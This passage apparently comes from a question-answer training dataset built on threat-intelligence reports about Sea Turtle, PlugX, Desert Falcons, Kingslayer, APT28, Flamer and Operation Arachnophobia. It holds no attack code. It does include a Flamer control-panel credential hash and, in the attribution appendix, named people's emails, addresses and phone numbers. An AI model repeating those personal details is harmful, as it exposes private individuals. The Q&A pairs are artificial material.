Greece, acknowledged on its that its network had been compromised on April 19, 2019. Based on Cisco telemetry, we determined that the actors behind the Sea Turtle campaign had access to the ICS-Forth network.\nCisco telemetry confirmed that the actors behind Sea Turtle maintained access to the ICS-Forth network from an operational command and control (C2) node. Our telemetry indicates that the actors maintained access in the ICS-Forth network through at least April 24, five days after the statement was publicly released. Upon analysis of this operational C2 node, we determined that it was also used to access an organization in Syria that was previously redirected using the actor-controlled name server ns1[.]intersecdns[.]com. This indicates that the same threat actors were behind both operations.\nWe also saw evidence that the threat actors researched the open-source tool . Notably, this particular C2 node searched for both blog.talosintelligence.com and (<https://www.ncsc.gov.uk/news/alert-dns-hijacking-activity>)ncsc.gov.uk, presumably to view Talos' previous reports on DNS hijacking and from the United Kingdom's National Cyber Security Centre.\nBig Headline: New actor-controlled nameserver\nWe recently discovered a new actor-controlled nameserver, rootdnservers[.]com, that exhibited similar behavior patterns as name servers previously utilized as part of the Sea Turtle campaign. The domain rootdnservers[.]com was registered on April 5, 2019 through the registrar NameCheap. The new actor-controlled name server rootdnservers[.]com was utilized to perform DNS hijacking against three government entities that all used .gr, the Greek ccTLD. It's likely that these hijackings were performed through the access the threat actors obtained in the ICS-Forth network. Below is a table showing the three most recent actor-controlled name servers that we have associated with this activity and their current operational status.\nBig Headline: Coverage and mitigations\nIn order to best protect against this type of attack, we compiled a list of potential actions. We have included additional security recommendations, that were highlighted by Bill Woodcock during his .\nWe recommend implementing multi-factor authentication, such as DUO, to secure the management of your organization's DNS records at your registrar, and to connect remotely to your corporate network via a Virtual Private Network (VPN).\nTalos suggests a registry lock service on your domain names, which will require the registrar to provide an out-of-band confirmation before the registry will process any changes to an organization's DNS record.\nDNSSEC sign your domains, either in-house, or using a DNS service provider which performs DNSSEC key-management services.\nDNSSEC validate all DNS lookups in your recursive resolver, either using in-house nameservers, or a service like Cisco Umbrella / OpenDNS.\nMake Internet Message Access Protocol (IMAP) email servers accessible only from your corporate LAN and to users who have already authenticated over a VPN.\nIf you suspect you were targeted by this type of activity, we recommend instituting a network-wide password reset, preferably from a computer on a trusted network.\nLastly, network administrators can monitor passive DNS record on their domains, to check for abnormalities.\n\nAnswer this question based on the above context: What specific actions did the Sea Turtle threat actors take to maintain access to the ICS-Forth network, and how did they leverage this access to target other organizations?",
    "output": "The Sea Turtle threat actors maintained access to the ICS-Forth network through an operational command and control (C2) node. They used this access to target an organization in Syria that was previously redirected using the actor-controlled name server ns1[.]intersecdns[.]com. This indicates that the same threat actors were behind both operations. Additionally, the actors researched open-source tools and viewed previous reports on DNS hijacking, suggesting they were actively monitoring and adapting to public disclosures about their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nRecently we published a paper about the capabilities of APT groups [(<https://nakedsecurity.sophos.com/2015/02/03/exploit-this-evaluating-the-exploit-skills-of-malware-gr>)https://nakedsecurity. (<https://nakedsecurity.sophos.com/2015/02/03/exploit-this-evaluating-the-exploit-skills-of-malware-gr>)sophos.com/2015/02/03/exploit-this-evaluating-the-exploit-skills-of-malware-groups/].\nOne of the conclusions of the paper was that the authors behind the targeted attack campaigns usually have little knowledge about the actual exploit they are using to distribute their malware. But at the same time, we warned our readers never to underestimate them, because otherwise they are skilled, and quite capable of developing sophisticated backdoors.\nOne of the worst performances in our comparison of exploit development belonged to the infamous PlugX malware group(s). However, they recently came out with a couple of significant developments in the backdoor component, demonstrating the point above.\nOne of the improvements was the introduction of a peer-to-peer communication channel to other infected hosts [(<http://blog.jpcert.or.jp/2015/01/analysis-of-a-r-ff05.html>)http://blog.jpcert.or.jp/2015/01/analysis-of-a-r-ff05.html]. Variants using this technology have previously been spotted in the Rotten Tomato campaign [(<http://blogs.sophos.com/2014/10/30/the-rotten-tomato-campaign-new-sophoslabs-research-on-apts/>)http://blogs.sophos. (<http://blogs.sophos.com/2014/10/30/the-rotten-tomato-campaign-new-sophoslabs-research-on-apts/>)com/2014/10/30/the-rotten-tomato-campaign-new-sophoslabs-research-on-apts/].\nNow additional samples have shown up from this generation. But in addition to the new communication method, some of them were showing another new characteristic: the payload was not stored as separate files, or embedded within the loader DLL, but instead was saved to the registry.\nMalware hiding components in registry is not a revolutionary idea; we have seen that before. Most notably the recent Poweliks Trojan [(<https://blog.gdatasoftware.com/blog/article/poweliks-the-persistent-malware-without-a-file.html>)https://blog.gdatasoftware.com/blog/article/poweliks-(<https://blog.gdatasoftware.com/blog/article/poweliks-the-persistent-malware-without-a-file.html>)the-persistent-malware-without-a-file.html] stored the active script component in the registry. Even some of the APT malware families, like Poison or Frethog, occasionally used the registry as storage for the main payload.\nThere were precursors even within the criminal groups distributing PlugX: they used this method back in 2013 in a couple of cases for storing the Omdork (a.k.a. Sybin) payload. So it was only a question of when the same would happen to the main PlugX backdoor. And that time arrived this January.\n\nWhy did the PlugX malware group decide to store its payload in the registry, and how does this method enhance the sophistication of their backdoor?",
    "output": "A: The PlugX malware group decided to store its payload in the registry as a way to enhance the stealth and persistence of their backdoor. This method is not entirely new, as other malware families like Poweliks, Poison, and Frethog have also used the registry for storing their main payload. By storing the payload in the registry, the malware can avoid detection by traditional file-based antivirus scanners, making it harder to detect and remove. Additionally, this technique allows the malware to remain persistent across system reboots without leaving obvious traces on the file system. The use of the registry for payload storage demonstrates the PlugX group's ability to adapt and innovate, even if their exploit development skills are considered subpar.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Introduction\nThe geopolitical conflicts in the Middle East have deepened over the last few years. The crisis is taking many forms, and the conflict in cyberspace is intensifying as different sides try to shift the struggle in their favour by exploiting cyber intelligence and distorting news.\nTargeted cyberattacks have also increased rapidly in the region over the last few years, with victims identified for almost every one of the major advanced cyberattack campaigns (Regin, Epic Turla, Careto, Nettraveler, Red October, Flame, Gauss, Duqu, and more.)\nThe Global Research and Analysis Team (GReAT) at Kaspersky Lab has uncovered new targeted attacks in the Middle East. Native Arabic-speaking cybercriminals have built advanced methods and tools to deliver, hide and operate malware that they have also developed themselves. This malware was originally discovered during an investigation of one of the attacks in the Middle East.\nPolitical activities and news are being actively used by the cybercriminals to entice victims into opening files and attachments. Content has been created with professionalism, with well designed visuals and interesting, familiar details for the victims, as if the information were long awaited.\nThe victims of the attacks to date have been carefully chosen; they are active and influential in their respective cultures, but also attractive to the cybercriminals as a source of intelligence and a target for extortion.\nThe attackers have been operating for more than two years now, running different campaigns, targeting different types of victims and different types of devices (including Windows- and Android-based). We suspect that at least 30 people distributed across different countries are operating the campaigns.\nAs a security organization, our analysis has focused only on the malware and the facts uncovered during our research.\nThe falcon is a popular and rare bird that has existed for a long time in Arabian countries with deserts, such as Egypt, Syria, the United Arab Emirates, Palestine, Saudi Arabia, and Oman, among others. It is also a symbol of hunting and sharp vision. The Desert Falcons are proficient cyberattackers, with carefully chosen targets, who are all thoroughly investigated before being attacked and infected.\n\nQ: What characteristics of the Desert Falcons' operations indicate that they are a sophisticated and organized group? Discuss the factors contributing to their advanced capabilities.",
    "output": "A: Several characteristics indicate that the Desert Falcons are a sophisticated and organized group. Firstly, they have been operating for over two years, running multiple campaigns targeting different types of victims and devices, including both Windows- and Android-based systems. Secondly, their operations involve at least 30 individuals distributed across various countries, suggesting a significant level of coordination and resources. Additionally, they have developed advanced methods and tools to deliver, hide, and operate their own malware, demonstrating technical proficiency. Their careful selection of high-value targets, who are influential in their respective cultures and attractive for intelligence gathering and extortion, further underscores their strategic approach.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat families referenced in this report\nThe definitions for the threat families referenced in this report are adapted from the Microsoft Malware Protection Center encyclopedia (<http://www.cve.mitre.org/cgi-bin/cvename.cgi>)(www.microsoft.com/security/portal), which contains detailed information about a large number of malware and unwanted software families. See the encyclopedia for more in-depth information and guidance for the families listed here and throughout the report.\nW97M/Adnel. A family of macro malware that can download other threats to the computer, including TrojanDownloader:Win32/Drixed.\nHTML/Adodb. A generic detection for script trojans that exploit a vulnerability in Microsoft Data Access Components (MDAC) that allows remote code execution. Microsoft released Security Bulletin MS06-014 in April 2006 to address the vulnerability.\nWin32/AlterbookSP. A browser add-on that formerly displayed behaviors of unwanted software. Recent versions of the add-on no longer meet Microsoft detection criteria, and are no longer considered unwanted software.\nWin32/Anogre. A detection for the Sweet Orange exploit kit, which exploits vulnerabilities in some versions of Windows, Adobe Flash Player, and Java to install malware.\nINF/Autorun. A family of worms that spreads by copying itself to the mapped drives of an infected computer. The mapped drives may include network or removable drives.\nJS/Axpergle. A detection for the Angler exploit kit, which exploits vulnerabilities in some versions of Internet Explorer, Silverlight, Adobe Flash Player, and Java to install malware.\nWin32/Bancos. A data-stealing trojan that captures online banking credentials and relays them to the attacker. Most variants target customers of Brazilian banks.\nWin32/Banker. A family of data-stealing trojans that captures banking credentials such as account numbers and passwords from computer users and relays them to the attacker. Most variants target customers of Brazilian banks; some variants target customers of other banks.\nWin32/Banload. A family of trojans that download other malware. Banload usually downloads Win32/Banker, which steals banking credentials and other sensitive data and sends it back to a remote attacker.\nWin32/BeeVry. A trojan that modifies a number of settings to prevent the computer from accessing security-related websites, and lower the computer's security.\nJS/Blacole. An exploit pack, also known as Blackhole, that is installed on a compromised web server by an attacker and includes a number of exploits that target browser software. If a vulnerable computer browses a compromised website that contains the exploit pack, various malware may be downloaded and run.\nMSIL/Bladabindi. A family of backdoors created by a malicious hacker tool called NJ Rat. They can steal sensitive information, download other malware, and allow backdoor access to an infected computer.\nJS/Bondat. A family of threats that collects information about the computer, infects removable drives, and tries to stop the user from accessing files. It spreads by infecting removable drives, such as USB thumb drives and flash drives.\nWin32/BrobanDel. A family of trojans that can modify boletos banc\u00e1rios, a common payment method in Brazil. They can be installed on the computer when a user opens a malicious spam email attachment.\nWin32/Chir. A family with a worm component and a virus component. The worm component spreads by email and by exploiting a vulnerability addressed by Microsoft Security Bulletin MS01-020. The virus component may infect .exe, .scr, and HTML files.\nWin32/CompromisedCert. A detection for the Superfish VisualDiscovery advertising program that was preinstalled on some Lenovo laptops sold in 2014 and 2015. It installs a compromised trusted root certificate on the computer, which can be used to conduct man-in-the-middle attacks on the computer.\nWin32/Conficker. A worm that spreads by exploiting a vulnerability addressed by Security Bulletin MS08-067. Some variants also spread via removable drives and by exploiting weak passwords. It disables several important system services and security products, and downloads arbitrary files.\nWin32/CouponRuc. A browser modifier that changes browser settings and may also modify some computer and Internet settings.\nWin32/CplLnk. A generic detection for specially-crafted malicious shortcut files that attempt to exploit the vulnerability addressed by Microsoft Security Bulletin MS10-046.\nWin32/Crowti. A ransomware family that encrypts files on the computer and demands that the user pay a fee to decrypt them, using Bitcoins.\nWin32/Dynamer. A generic detection for a variety of threats.\nWin32/Dyzap. A threat that steals login credentials for a long list of banking websites using man-in-the-browser (MITB) attacks. It is usually installed on the infected computer by TrojanDownloader:Win32/Upatre.\nWin32/EoRezo. Adware that displays targeted advertising to affected users while browsing the Internet, based on downloaded pre-configured information.\nWin32/Foosace. A threat that creates files on the compromised computer and contacts a remote host.\nWin32/Frethog. A large family of password-stealing trojans that targets confidential data, such as account information, from massively multiplayer online games.\nWin32/Gamarue. A worm that is commonly distributed via exploit kits and social engineering. Variants have been observed stealing information from the local computer and communicating with command-and-control (C&C) servers managed by attackers.\nAndroidOS/GingerMaster. A malicious program that affects mobile devices running the Android operating system. It may be bundled with clean applications, and is capable of allowing a remote attacker to gain access to the mobile device.\nWin32/IeEnablerCby. A browser modifier that installs additional browser add-ons without the user's consent. It bypasses the normal prompts or dialogs that ask for consent to install add-ons.\nWin32/InstalleRex. A software bundler that installs unwanted software, including Win32/CouponRuc and Win32/SaverExtension. It alters its own \"Installed On\" date in Programs and Features to make it more difficult for a user to locate it and remove it.\nDOS/JackTheRipper. A virus that can stop some files from working correctly in Windows XP and earlier operating systems. It spreads by infecting the master boot record (MBR) on connected hard disks and floppy disks.\nVBS/Jenxcus. A worm that gives an attacker control of the computer. It is spread by infected removable drives, like USB flash drives. It can also be downloaded within a torrent file.\nALisp/Kenilfe. A worm written in AutoCAD Lisp that only runs if AutoCAD is installed on the computer or network. It renames and deletes certain AutoCAD files, and may download and execute arbitrary files from a remote host.\nWin32/Kilim. A trojan that hijacks the user's Facebook, Twitter, or YouTube account to promote pages. It may post hyperlinks or like pages on Facebook, post comments on YouTube videos, or follow profiles and send direct messages on Twitter without permission.\nWin32/KipodToolsCby. A browser modifier that installs additional browser add-ons without the user's consent. It bypasses the normal prompts or dialogs that ask for consent to install add-ons.\nJS/Krypterade. Ransomware that fraudulently claims the computer has been used for unlawful activity, locks it, and demands that the user pay to unlock it.\nUnix/Lotoor. A detection for specially crafted Android programs that attempt to exploit vulnerabilities in the Android operating system to gain root privilege.\nWin32/Macoute. A worm that can spread itself to removable USB drives, and may communicate with a remote host.\nMSIL/Mofin. A worm that can steal files from your PC and send them to a malicious hacker. It spreads via infected removable drives, such as USB flash drives.\nWin32/Nuqel. A worm that spreads via mapped drives and certain instant messaging applications. It may modify system settings, connect to certain websites, download arbitrary files, or take other malicious actions.\nWin32/Obfuscator. A generic detection for programs that have had their purpose disguised to hinder analysis or detection by antivirus scanners. Such programs commonly employ a combination of methods, including encryption, compression, anti-debugging and anti-emulation techniques.\nWin32/Ogimant. A threat that claims to help download items from the Internet, but actually downloads and runs files that are specified by a remote attacker.\nHTML/Pangimop. A detection for the Magnitude exploit kit, also known as Popads. It attempts to exploit vulnerabilities in programs such as Java and Adobe Flash Player to install other malware.\nWin32/Pdfjsc. A family of specially crafted PDF files that exploit Adobe Acrobat and Adobe Reader vulnerabilities. Such files contain malicious JavaScript that executes when the file is opened.\nWin32/Peaac. A generic detection for various threats that display trojan characteristics.\nWin32/Peals. A generic detection for various threats that display trojan characteristics.\nJS/Proslikefan. A worm that spreads through removable drives, network shares, and P2P programs. It can lower the computer's security settings and disable antivirus products.\nWin32/Radonskra. A family of threats that perform a variety of malicious acts, including stealing information about the computer, showing extra advertisements as the user browses the web, performing click fraud, and downloading other programs without consent.\nWin32/Ramnit. A family of multi-component malware that infects executable files, Microsoft Office files, and HTML files. Win32/Ramnit spreads to removable drives and steals sensitive information such as saved FTP credentials and browser cookies. It may also open a backdoor to await instructions from a remote attacker.\n\nQ: Describe the functionality and impact of the Win32/Conficker worm, including its methods of propagation and the system services it affects.",
    "output": "A: Win32/Conficker is a worm that spreads by exploiting a vulnerability addressed by Security Bulletin MS08-067. Additionally, some variants of Conficker spread via removable drives and by exploiting weak passwords. Once it infects a system, Conficker disables several important system services and security products, and downloads arbitrary files. This can lead to significant disruption and potential further compromise of the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: TARGETED TAKEDOWN AND SINKHOLING OF WWW.ORACLESOFT[.]NET\nArmed with the evidence that www.oraclesoft[.]net was being used strictly for malicious purposes, RSA Research sinkholed4 it to further inform our Kingslayer investigation.\nWithin a few days of the sinkholing, RSA Research identified many of the infected organizations beaconing to our sinkhole and provided compromise notifications. One of the infected organizations, dubbed \"Iota\" for the purposes of this publication, subsequently engaged the RSA Incident Response (IR) team for remediation assistance.\nAnswer this question: In the context of the Kingslayer supply-chain attack, what strategic action did RSA Research take after identifying www.oraclesoft[.]net as a malicious domain, and how did this action contribute to the broader investigation and response efforts?",
    "output": "RSA Research took the strategic action of sinkholing the malicious domain www.oraclesoft[.]net. This involved redirecting traffic intended for the malicious domain to a controlled server operated by RSA Research. By doing so, RSA Research was able to identify many of the infected organizations that were beaconing to the sinkhole. This allowed them to provide compromise notifications to these organizations, including one organization dubbed 'Iota,' which subsequently sought remediation assistance from the RSA Incident Response (IR) team. This action significantly contributed to the broader investigation by helping to map out the extent of the infection and facilitating the response efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT28 use Phishing: Spearphishing Attachment to target its victims and what tactics does it employ to increase the likelihood of successful exploitation?",
    "output": "Phishing: Spearphishing Attachment is a type of social engineering attack where adversaries send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. APT28, a Russian-speaking threat group, has been observed using spearphishing emails to target its victims, including individuals affiliated with European security organizations and global multilateral institutions. To increase the likelihood of successful exploitation, APT28 tailors its spearphishing emails to mention specific topics (lures) relevant to the recipients, making it more likely that they will believe the email is legitimate and open the attached file or click on a link. Furthermore, APT28 has been known to register domains that mimic those of legitimate news, politics, or other websites, indicating topics that are relevant to its targets. The group's use of counter-analysis capabilities, such as runtime checks to identify analysis environments and obfuscated strings unpacked at runtime, also suggests a high level of sophistication and planning in its phishing campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The control panel\nAccess to the Flamer control panel requires authentication:\nFigure 5\nControl panel login page\nThe following credentials are used to gain access to the control panel (only the MD5 password hash is available; attempts to crack the password were unsuccessful):\nUsername: username\nPassword Hash: 27934e96d90d06818674b98bec7230fa\nThe control panel for interacting with Flamer-compromised computers is very basic. The simple interface allows the operators to upload packages and download encrypted data stolen from the compromised clients. The operator is required to upload specially crafted tar.gz files. The archived filename needs to follow a specific format, which is parsed and then stored in the ads or news directory, depending on the file extension used.\nThe filename format for these packages is as follows:\nThe following is a screen shot of the control panel that allows the operator to upload data to the server:\nFigure 6\nControl panel data upload screen\nThis approach to uploading packages and downloading data fits the profile of military and intelligence operations. A typical control panel is easy to use and self-explanatory. The operator has full control over what to do with the compromised clients and has the ability to retrieve and inspect the stolen information. The Flamer control panel provides limited capabilities to the operator, preventing them from viewing and interpreting the information being exchanged.\nThis approach would help prevent operators from knowing what is contained within the packages or the significance of the data being exchanged between clients and the attackers. Such a design would also serve as a defensive measure as it would prevent arbitrary packages from being uploaded and prevent downloaded data being from being inspected by unknown parties that may have gained access to the control panel.\nThe following screen on the control panel allows the user to view and download backed up data from the server:\nFigure 7\nControl panel screen for downloading stolen data\nThe tar.gz contains all the relevant stolen data and details of where the information was stolen from. The private key is required here to inspect the encrypted data.\nSmall Headline: Schema\nThe database is used to store the relevant data about connecting clients, packages to send to the clients, some logging and settings required for encryption, and authentication to access the control panel.\nFigure 8\nNewsforyou application database schema\nThe session_log, log, and client_log are all encrypted using the keys stored in the settings table shown below and were successfully decrypted:\nThe database is regularly emptied by the delete.php script; there is limited data in it. The following table gives a brief description of the tables found in the database:\nThe session_log table contains details of all connections to the server while client_log only contains connections with a recognized protocol (e.g. valid compromised computers).\nExamining the data in the table indicates that 1071 valid requests were recorded from compromised clients. A decrypted client log entry contains the following information:\nCLIENT _ ID:[UUID]\nCLIENT _ TYPE:3\nCLIENT _ VERSION:0\nREQUEST _ TYPE:0\nNAME=&FILE _ SIZE=0\nPROTOCOL:1\nThe four encrypted requests in the database on the first server are W32.Flamer client requests, which use the old protocol:\n\u2022 CLIENT\n\u2022 PROTOCOL\n= 3 =\nCLIENT_TYPE_FL\n= 1\n= OLD_PROTOCOL\nThe additional sessions logged are likely attributed to researchers who had discovered the whereabouts of the command-and-control servers.\nThe session_log data contained three separate HTTP_HOST values, indicating multiple Flamer C&C server URLs were used to access this server.\nAlthough only one encrypted file existed in the newsforyou/entries folder (the stolen data uploaded from the compromised clients), the database reveals that 189 records had been created. The other 188 files had already been removed from the server. The entry left on the server had been successfully stolen from the computer located in Israel.\nA final point to note here is in relation to the entry in the news_entries table. Only one record ever existed: the malicious payload to clean the computers up, uploaded on May 18, 2012, at 13.43:45. This server only served up one package and it was uploaded as soon as the server had been initially configured. The last time a compromised client connected to the server was Friday, June 1, 2012, at 11:42:47, and the last log recorded in the database was Friday, June 1, 2012, at 11:46:01.\nBig Headline: Conclusion\nExamining the W32.Flamer servers has provided additional insight into the architecture of not only the threat, but also into the command structure of the entities behind it. The server code was written and updated by at least four separate individuals, indicating a continuing development effort to support W32.Flamer and, potentially, new or additional threats of a similar nature. The command-and-control Web application has been in active development for many years, possibly as early as 2006, which is well before Flamer's earliest seen compilation date in 2010.\nThe operators of the C&C servers may be a group of less senior individuals, working on a need-to-know basis, as the operator is not required (nor has the permission) to interpret the value or purpose of the incoming data. Only the attackers have the permission to access and interpret this data. This separation of operational and attacker visibility and roles indicates that this is the work of a highly organized and sophisticated group. The likelihood of a large and well-funded entity's involvement in Flamer is corroborated by the use of the unique certificate weakness used to hijack the Windows Update feature to spread across networks.\nThey were also careful to unload and archive data where necessary, remove duplicate files, and delete unnecessary files to prevent the server from running out of disk space. This was an ongoing development up to 2011. R***'s edits in the source code suggest the concern was less about updating protocols and more about ensuring there was ample room on the servers for the stolen data to be uploaded to, begging the question of how much data was actually being stolen.\nThis investigation simply provides a snapshot in time of the Flamer attack campaign. Considering that logging was disabled and data was wiped clean in such a thorough manner, the remaining clues make it virtually impossible to determine the entity behind the campaign. There is little doubt that the larger project involving cyber-espionage tools, such as Flamer, will continue to evolve and retrieve information from the designated targets.\nBig Headline: Resources\nFlamer: Highly Sophisticated and Discreet Threat Targets the Middle East (<http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east>)http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east\nPainting a Picture of W32.Flamer\nFlamer: A Recipe for Bluetoothache\nW32.Flamer: Spreading Mechanism Tricks and Exploits (<http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits>)http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits\nW32.Flamer: Leveraging Microsoft Digital Certificates (<http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates>)http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates\nW32.Flamer: Microsoft Windows Update Man-in-the-Middle (<http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle>)http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle\nW32.Flamer: Enormous Data Collection (<http://symantec.com/connect/blogs/w32flamer-enormous-data-collection>)http://symantec.com/connect/blogs/w32flamer-enormous-data-collection\nFlamer: Urgent Suicide\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nBig Headline: About Symantec\nSymantec is a global leader in providing security, storage and systems management solutions to help businesses and consumers secure and manage their information. Headquartered in Mountain View, Calif., Symantec has operations in more than 40 countries. More information is available at (<www.symantec.com>)www.symantec.com.\nFor specific country offices and contact numbers, please visit our Web site. For product information in the U.S., call toll-free 1 (800) 745 6054.\nSymantec Corporation\nWorld Headquarters\n350 Ellis Street\nMountain View, CA 94043 USA\n+1 (650) 527-8000\nCopyright \u00a9 2012 Symantec Corporation. All rights reserved. Symantec and the Symantec logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nQuestion: What role did the database play in the operation of the Flamer command-and-control server, and how was data security managed within the database?",
    "output": "Answer: The database played a crucial role in storing relevant data about connecting clients, packages to send to the clients, some logging, and settings required for encryption and authentication to access the control panel. Data security within the database was managed by encrypting the session_log, log, and client_log tables using keys stored in the settings table. The database was regularly emptied by the delete.php script to maintain minimal data retention. This approach helped in preventing the server from running out of disk space and hindered potential investigations if the server were to be discovered.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: APPENDIX E: VPSNOC & Digital Linx Associations\nAccording to the vpsnoc.com website \"In 2007 five VPS experts decided to invest in their very own private rack space in the heart of Kansas, the United States. Their aim? To bring service-oriented, quality managed and unmanaged VPS solutions to clients all over the world. Just 1 year later, after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients receiving quality U.S support. Their company continued to build momentum.\" 60\nWhois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant organization with a Kansas City-based address, telephone number 925-665-1427, and administrative email address admin@digitallinx. org.61 This is the same registrant record for the digitallinx.net domain.62 The digitallinx.net/sitemap.xml63 and the corresponding Google cache64 for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same time. The digitallinx.net/Contact.html65 identified similar overlaps with data across the .org, .net, and .com domains.\nThe domain digitallinx.com is registered to Perasona #1.66 67 68 69 He uses email addresses naseer@digitallinx.com and nbhatti@ gmail.com as the domain registrant email address, along with address 638-F Johar Town, Lahore Pakistan and telephone 966.548805579.70 The DigitalLinx (digitallinx.com) website states that it is \"a web hosting / Web Solutions & Processing Outsourcing Company based in Pakistan\".\nOpen source research of the phone number 925-665-1427 indicates that it is also used within site content as a phone number for defiantmarketing.com. This domain is registered by Persona #2 71 who uses the aliases \"agnosticon\" and \"agnostic\". Persona #2 lists VPSNOC as the registrant organization, and uses the registration email address of abunasar@yahoo.com with an address of House 12, Street 21, F-8/1 Islamabad Federal 44000. The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services.\nWithin a January 2009 posting to a Debian users forum, Persona #2 sends an email from the abunasar@yahoo.com with a reply-to as abunasar@army.com.72 Within the post, Persona #2 responds to the question \"Who's using Debian\" listing DigitalLinx, Kansas City MO and the link to digitallinx.com. Also, the seemingly abandoned Twitter profile for Persona #273 is only following the Twitter profile for @VPSNOC.74\nIn an April 2012 post to blackhatworld.com, a user with the alias \"agnosticon\" posted promotional codes for VPSNOC hosting services, engaging with customers, providing them feedback regarding VPS services and thanking them for positive reviews.75 Within the posting the user \"agnosticon\" included an image which was an actual advertisement that was hosted at http://vpsnoc. com/order.png.76 77 Within the posted image it states \"VPSNOC is a subdivision of Digital Linx Hosting. We have been in business since 2008\". The posting concludes with \"If you have any further questions/queries please contact us directly at: support@vpsnoc.com\"\n69 Appendix F: Personas; Persona #1 Muhammad Naseer Bhatti\n60 http://vpsnoc.com\n61 https://whois.domaintools.com/vpsnoc.com\n62 https://whois.domaintools.com/digitallinx.net\n63 digitallinx.net/sitemap.xml\n64 http://webcache.googleusercontent.com/search?q=cache:CtCiQUGgUaoJ:www.digitallinx.net/sitemap.xml+&cd=1&hl=en&ct=clnk&gl=us\n65 digitallinx.net/Contact.html\n66 https://whois.domaintools.com/digitallinx.com\n67 http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815\n68 https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ\n70 https://github.com/digitallinx/vBilling/blob/master/CHANGELOG\n71 Appendix F: Personas; Persona #2 Abunasar Khan\n72 https://lists.debian.org/debian-www/2009/01/msg00186.html\n73 https://twitter.com/abunasar\n74 https://twitter.com/vpsnoc\n75 http://www.blackhatworld.com/blackhat-seo/members/32481-agnosticon.html\n77 http://vpsnoc.com/order.png\n76 http://www.blackhatworld.com/blackhat-seo/hosting/430705-unmetered-vps-hosting-get-50-off-your-first-month-exclusive-coupons-bhw.html\nMedium Headline: Persona #1:\nMuhammad Naseer Bhatti's LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling (vbilling.org) as well as a consultant for a U.S. company78. Both Bhatti and Digital Linx are listed as the registrants for vbilling.org79, v-billing. com80, vgriffins.com81 and my-server.co82, which use P.O. Box 295658, Riyadh Saudi Arabia83 as the registration address. This is also the address for two U.S. companies' local operations. Bhatti is also listed as the owner of the netblock 46.4.139.224/28. Both passive DNS sources as well as Robtex84 highlight this overlapping infrastructure.85\nFrom September 7 - 9, 2011, Tranchulas in cooperation with the Pakistan National University of Sciences and Technology86 (NUST), offered a Certified Penetration Testing Profession (CPTP) Workshop87 (Figure 17). During the workshop, basic penetration techniques and skills were presented88. It is likely that CPTP workshops and alignment with NUST have allowed Tranchulas the opportunity to recruit student interns.89\n78 http://sa.linkedin.com/pub/muhammad-naseer-bhatti/9/18a/815\n79 http://whois.domaintools.com/vbilling.org\n80 http://whois.domaintools.com/v-billing.com\n81 http://whois.domaintools.com/vgriffins.com\n82 http://whois.domaintools.com/my-server.co\n83 http://saudi.emc.com/contact/contact-us.htm\n84 https://www.robtex.com/dns/digitallinx.com.html\n86 www.nust.edu.pk\n87 http://seecs.nust.edu.pk/Seminars_workshops/pages/tranchulas_hacking_workshop/index.php\n85 http://whatmyip.co/info/whois/46.4.139.225\n88 Digital Appendix 1: Research Collateral (Program.pdf)\n89 http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profiles%20booklet-%202013%20(SEECS).pdf\nWithin the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number (051-2871433)90. It is important to note that Muhammad Naseer Bhatti has been previously known to drop91 the family name \"Bhatti\"\nwithin online correspondence (Figure 18). In a June 2012 episode of Engineering and Technology Magazine92 podcast a Mohammed Nasser, Penetration Tester at Tranchulas was interviewed93. A Mohammed Nasser may also be directly affiliated94 with Tranchulas.\n90 http://www.linkedin.com/groups/Tranchulas-Handson-Ethical-Hacking-Training-2616369.S.75237952\n91 https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ\nThis links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer. It is unknown if this is the same Muhammad Naseer that is associated with VPSNOC's parent company Digital Linx, the Pakistan-based service provider which hosted the original BITTERBUG malware.\n92 http://eandt.theiet.org/magazine/2012/06/\n93 http://eandt.theiet.org/magazine/2012/06/et-podcast-18.cfm\n94 http://www.zoominfo.com/s/#!search/profile/person?personId=1627460418&targetid=profile\nQ: How did the investigation into VPSNOC and Digital Linx reveal connections to Operation Arachnophobia, and what specific details linked these entities to each other?",
